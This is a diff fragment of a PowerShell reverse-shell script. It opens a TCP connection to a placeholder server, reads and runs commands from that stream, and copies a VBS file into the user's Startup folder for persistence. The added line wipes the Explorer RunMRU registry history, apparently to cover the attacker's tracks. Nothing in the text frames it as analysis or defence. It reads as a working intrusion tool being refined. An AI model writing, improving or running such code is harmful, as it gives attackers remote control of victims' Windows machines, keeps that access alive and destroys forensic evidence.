@@ -2,6 +2,7 @@ Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("<SERV
 Set-Variable -Name stream -Value ($client.GetStream());
 [byte[]]$bytes = 0..65535|%{0};
 Move-Item C:\Users\Public\s.vbs "C:\Users\${env:USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
+Remove-ItemProperty -Path Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Name "*";
 
 while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){
     ;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));
